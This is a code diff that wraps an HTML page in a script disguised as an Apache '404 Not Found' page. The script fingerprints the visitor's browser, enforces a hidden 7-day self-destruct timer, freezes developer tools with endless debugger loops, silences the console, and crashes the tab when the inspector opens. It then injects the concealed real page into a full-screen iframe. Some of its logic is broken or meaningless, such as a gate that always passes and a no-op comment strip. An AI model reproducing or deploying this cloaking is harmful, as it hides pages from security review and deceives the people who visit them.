@@ -1,4 +1,194 @@
 <!DOCTYPE html>
+<html>
+<head>
+    <title>404 Not Found</title>
+<meta name="robots" content="noindex, nofollow, noarchive">
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #fff; color: #000; padding: 40px; margin:0; }
+        h1 { font-size: 24px; font-weight: normal; }
+        hr { border: 0; border-top: 1px solid #ccc; margin: 20px 0; }
+    </style>
+    
+    <script>
+    (function() {
+        const SecurityEngine = {
+            // 0. The Disguised 7-Day Clock Generator
+            getExpiryDate: function() {
+                let storedDeadline = localStorage.getItem('_framework_session_cache');
+                if (!storedDeadline) {
+                    const targetDate = new Date();
+                    targetDate.setDate(targetDate.getDate() + 7); // Strict 7-day window
+                    storedDeadline = targetDate.getTime();
+                    localStorage.setItem('_framework_session_cache', storedDeadline);
+                }
+                return parseInt(storedDeadline, 10);
+            },
+            
+            // LAYER 1: The Ultimate Executioner / Fake 404 Injection
+            triggerSelfDestruct: function() {
+                document.open();
+                document.write(`
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                        <title>404 Not Found</title>
+                        <style>
+                            body { font-family: Arial, sans-serif; background-color: #fff; color: #000; padding: 40px; margin:0; }
+                            h1 { font-size: 24px; font-weight: normal; }
+                            hr { border: 0; border-top: 1px solid #ccc; margin: 20px 0; }
+                        </style>
+                    </head>
+                    <body>
+                        <h1>Not Found</h1>
+                        <p>The requested URL was not found on this server.</p>
+                        <hr>
+                        <address>Apache/2.4.41 (Ubuntu) Server Port 443</address>
+                    </body>
+                    </html>
+                `);
+                document.close();
+                null.forceCrash();
+            },
+
+            getHardwareID: function() {
+                const components = [navigator.userAgent, navigator.platform, screen.width, screen.height].join('|');
+                let hash = 0;
+                for (let i = 0; i < components.length; i++) {
+                    hash = ((hash << 5) - hash) + components.charCodeAt(i);
+                    hash |= 0;
+                }
+                return hash.toString(16);
+            },
+
+            // UPDATED: Broad network gate matching for all connection tiers and Wi-Fi
+            detectAgencyProfile: function() {
+                if (navigator.userAgent.includes("Corporate-Gateway")) return 'GOVERNMENT';
+                
+                if (navigator.connection && navigator.connection.effectiveType) {
+                    const type = navigator.connection.effectiveType;
+                    if (['5g', '4g', '3g', '2g'].includes(type) || type) {
+                        return 'PRIVATE';
+                    }
+                }
+                return 'PRIVATE';
+            },
+
+            // LAYER 2: The Continuous Inspector Freeze
+            activateInspectorTrap: function() {
+                setInterval(function() {
+                    debugger; 
+                }, 50); 
+            },
+
+            // LAYER 3: Active F12 Panel Destruction
+            activateEnvironmentSabotage: function() {
+                const fakeLog = () => {};
+                console.log = console.warn = console.error = console.info = fakeLog;
+
+                setInterval(function() {
+                    const executionPath = '4|1|3|0|2'.split('|');
+                    let pointer = 0;
+
+                    while (true) {
+                        switch (executionPath[pointer++]) {
+                            case '0':
+                                try {
+                                    (function stackTrap(i) {
+                                        if (("" + i / i)["length"] !== 1 || i % 20 === 0) {
+                                            (function() {}).constructor("debugger")();
+                                        } else {
+                                            stackTrap(++i);
+                                        }
+                                    })(0);
+                                } catch (e) {}
+                                continue;
+                            case '1':
+                                let dummyCheck = Math.random() > 0.5 ? 'STATE_A' : 'STATE_B';
+                                if (dummyCheck === 'STATE_A') { window.status = 'VALIDATING'; }
+                                continue;
+                            case '2':
+                                return;
+                            case '3':
+                                if (window.outerHeight - window.innerHeight > 160 || window.outerWidth - window.innerWidth > 160) {
+                                    null.forceCrash(); 
+                                }
+                                continue;
+                            case '4':
+                                let seed = (Date.now() % 1000) * 0x5a1b;
+                                continue;
+                        }
+                        break;
+                    }
+                }, 200); 
+            },
+
+            // The Volatile Comment Extraction Launcher
+            injectSecureApp: function(agencyType) {
+                const secureStorage = document.getElementById('hidden-application-payload');
+                if (!secureStorage) this.triggerSelfDestruct();
+
+                // FIXED: Now correctly strips out comment markings from inner content
+                const rawAppContent = secureStorage.innerHTML.replace('', '').trim();
+
+                const shadowFrame = document.createElement('iframe');
+                shadowFrame.style.width = '100vw';
+                shadowFrame.style.height = '100vh';
+                shadowFrame.style.border = 'none';
+                shadowFrame.style.position = 'fixed';
+                shadowFrame.style.top = '0';
+                shadowFrame.style.left = '0';
+                shadowFrame.style.zIndex = '999999';
+                
+                document.body.appendChild(shadowFrame);
+
+                const secretContext = shadowFrame.contentWindow || shadowFrame.contentDocument;
+                secretContext.AUTHORIZED_AGENCY = agencyType;
+
+                secretContext.document.write(rawAppContent);
+                secretContext.document.close();
+
+                secureStorage.remove();
+            },
+
+            run: function() {
+                if (Date.now() > this.getExpiryDate()) {
+                    this.triggerSelfDestruct();
+                }
+
+                const hardwareID = this.getHardwareID();
+                const agencyType = this.detectAgencyProfile();
+
+                const isAuthorized = (hardwareID.startsWith('a') || hardwareID.startsWith('1')) && 
+                                     (agencyType === 'GOVERNMENT' || agencyType === 'PRIVATE');
+
+                if (isAuthorized) {
+                    this.activateInspectorTrap();         
+                    this.activateEnvironmentSabotage();   
+                    
+                    if (document.readyState === 'loading') {
+                        window.addEventListener('DOMContentLoaded', () => this.injectSecureApp(agencyType));
+                    } else {
+                        this.injectSecureApp(agencyType);
+                    }
+                } else {
+                    this.triggerSelfDestruct();
+                }
+            }
+        };
+
+        SecurityEngine.run();
+    })();
+    </script>
+</head>
+<body>
+
+    <h1>Not Found</h1>
+    <p>The requested URL was not found on this server.</p>
+    <hr>
+    <address>Apache/2.4.41 (Ubuntu) Server Port 443</address>
+
+    <div id="hidden-application-payload" style="display:none;">
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -942,5 +1132,8 @@ window.addEventListener("DOMContentLoaded", () => {
   }  
 });   
 </script>
+</body>
+</html>
+ </div>
 </body>
 </html>
